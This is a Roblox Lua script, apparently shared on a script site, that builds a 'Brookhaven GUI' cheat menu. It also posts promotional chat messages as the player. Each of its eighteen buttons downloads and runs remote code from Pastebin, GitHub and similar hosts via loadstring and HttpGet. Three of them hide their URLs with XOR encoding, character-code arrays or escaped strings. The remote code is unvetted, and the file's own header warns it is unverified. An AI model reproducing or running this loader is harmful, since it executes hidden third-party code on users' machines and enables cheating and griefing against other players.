--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- ==================== CONFIG & INITIAL SETUP ====================
local SOUND_ID = "rbxassetid://17594884733"
local PLAY_DURATION = 6.999999999999

local sound = Instance.new("Sound")
sound.SoundId = SOUND_ID
sound.Volume = 1
sound.Looped = false
sound.Parent = game.Workspace

local function playAndStopSound()
    if not sound.SoundId or sound.SoundId == "" then
        warn("No valid SoundId set.")
        return
    end
    sound:Play()
    print("Sound started...")
    task.wait(PLAY_DURATION)
    if sound.IsPlaying then
        sound:Stop()
        print("Sound stopped after " .. PLAY_DURATION .. " seconds.")
    end
end

playAndStopSound()

-- ==================== CHAT MESSAGES ====================
local TextChatService = game:GetService("TextChatService")
local channel = TextChatService.TextChannels:WaitForChild("RBXGeneral", 10)

if channel then
    channel:SendAsync("loading...")
    task.wait(3)
    channel:SendAsync("this script was made by kyelisz")
    task.wait(3)
    channel:SendAsync("more updates incoming.")
    task.wait(2)
    channel:SendAsync("JOIN KYELISZ TEAM TODAY!")
end

-- ==================== CLEAN MAIN GUI ====================
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- MAIN FRAME (draggable, rounded, rainbow outline)
local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Size = UDim2.new(0, 340, 0, 520)
MainFrame.Position = UDim2.new(0.5, -170, 0.5, -260)
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = false

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 12)
FrameCorner.Parent = MainFrame

local MenuStroke = Instance.new("UIStroke")
MenuStroke.Thickness = 4
MenuStroke.Parent = MainFrame

-- TITLE
local Title = Instance.new("TextLabel")
Title.Parent = MainFrame
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.Text = "Brookhaven GUI"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Center

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = Title

-- SCROLLABLE AREA (clean & functional)
local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Parent = MainFrame
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.Size = UDim2.new(1, -20, 1, -70)
ScrollingFrame.Position = UDim2.new(0, 10, 0, 60)
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

local ListLayout = Instance.new("UIListLayout")
ListLayout.Parent = ScrollingFrame
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ListLayout.Padding = UDim.new(0, 8)

local ScrollPadding = Instance.new("UIPadding")
ScrollPadding.Parent = ScrollingFrame
ScrollPadding.PaddingLeft = UDim.new(0, 8)
ScrollPadding.PaddingRight = UDim.new(0, 8)
ScrollPadding.PaddingTop = UDim.new(0, 8)

-- ==================== BUTTON CREATOR (clean & reusable) ====================
local function createButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Parent = ScrollingFrame
    btn.Size = UDim2.new(1, -16, 0, 45)
    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.Font = Enum.Font.GothamSemibold
    btn.LayoutOrder = #ScrollingFrame:GetChildren() - 1
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = btn
    
    local btnStroke = Instance.new("UIStroke")
    btnStroke.Thickness = 1
    btnStroke.Color = Color3.fromRGB(80, 80, 80)
    btnStroke.Parent = btn
    
    btn.MouseButton1Click:Connect(callback)
    return btn
end

-- ==================== BUTTON ACTIONS (unchanged) ====================
local Button1Action = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zLspNekY"))()
end

local Button2Action = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua'))()
end

local Button3Action = function()
    local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\193\194\200\49\227\189\222\80\208\211\203\106\212\147\211\15\220\146\232\7\169\169\198\9","\126\177\163\187\69\134\219\167")))();
end

local Button4Action = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dreamy9x9x/darkaureus/refs/heads/main/brookhaven.lua"))()
end

local Button5Action = function()
    local url = string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,70,114,111,115,116,50,51,48,47,69,109,98,101,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,69,109,98,101,101,83,99,114,105,112,116)
    loadstring(game:HttpGet(url))()
end

local Button6Action = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kayrus999/VoidHub/refs/heads/main/VoidHub.txt"))()
end

local Button7Action = function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\103\105\116\104\117\98\46\99\111\109\47\99\111\110\116\97\116\101\115\116\101\56\47\79\97\79\97\79\97\79\97\45\69\98\69\98\69\98\69\98\47\114\97\119\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\68\114\105\112\67\108\105\101\110\116\79\98\102\46\116\120\116\34\41\41\40\41")()
end

local Button8Action = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/bruton-lua-sources/Troling/refs/heads/main/Troll.lua"))()
end

local Button9Action = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end

local Button10Action = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nxvap/hexagon/refs/heads/main/brookhaven"))()
end

local Button11Action = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/FWwdST5Y"))()
end

local Button12Action = function()
    loadstring(game:HttpGet("https://pastefy.app/oay8bgXY/raw?part=Oooooooieiiiie%20toibingu", true))()
end

local Button13Action = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bPnmeDGz"))()
end

local Button14Action = function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Emote-Gui-75782"))()
end

local Button15Action = function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/flyroblox42-glitch/7234f75a3f99a6f76b6257593753a072/raw?t=" .. tick()))()
end

local Button16Action = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/8FaTGdpL"))()
end

local Button17Action = function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/mikey-71872/Miha/refs/heads/main/Mi")))()
end

local Button18Action = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Aedynjames17/celestialexecutor/48e980f113c8966531d1652c8df82c16ff0924c8/newcelestialv1.1"))()
end

-- ==================== CREATE BUTTONS (no manual positions needed) ====================
createButton("AJ MUSIC HUB", Button1Action)
createButton("SANDER X", Button2Action)
createButton("takito hub", Button3Action)
createButton("nytherune hub", Button4Action)
createButton("EMBEE HUB", Button5Action)
createButton("Void Hub", Button6Action)
createButton("Drip Client", Button7Action)
createButton("loc4t Hub", Button8Action)
createButton("Infinite Yield", Button9Action)
createButton("Hexagon Client", Button10Action)
createButton("sus script fe", Button11Action)
createButton("INVISIBLE", Button12Action)
createButton("AJ SPAMMER", Button13Action)
createButton("AJ EMOTE HUB", Button14Action)
createButton("FLYBOT AI CHATBOT-key is bot1", Button15Action)
createButton("Teleport v1 (new!)", Button16Action)
createButton("Mikey iraq", Button17Action)
createButton("CelestialExecutor", Button18Action)

-- ==================== CIRCLE TOGGLE (draggable) ====================
local ToggleCircle = Instance.new("TextButton")
ToggleCircle.Parent = ScreenGui
ToggleCircle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ToggleCircle.Size = UDim2.new(0, 70, 0, 70)
ToggleCircle.Position = UDim2.new(0.5, -380, 0.5, -35)
ToggleCircle.Active = true
ToggleCircle.Draggable = true
ToggleCircle.Text = "D"
ToggleCircle.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleCircle.TextScaled = true
ToggleCircle.Font = Enum.Font.GothamBold

local CircleCorner = Instance.new("UICorner")
CircleCorner.CornerRadius = UDim.new(0.5, 0)
CircleCorner.Parent = ToggleCircle

local CircleStroke = Instance.new("UIStroke")
CircleStroke.Thickness = 5
CircleStroke.Parent = ToggleCircle

-- ==================== TOGGLE LOGIC ====================
local menuOpen = false
ToggleCircle.MouseButton1Click:Connect(function()
    menuOpen = not menuOpen
    MainFrame.Visible = menuOpen
end)

-- ==================== RAINBOW ANIMATION ====================
local RunService = game:GetService("RunService")
RunService.Heartbeat:Connect(function()
    local hue = (tick() % 4) / 4
    local color = Color3.fromHSV(hue, 1, 1)
    CircleStroke.Color = color
    MenuStroke.Color = color
end)

print("✅ loaded.")
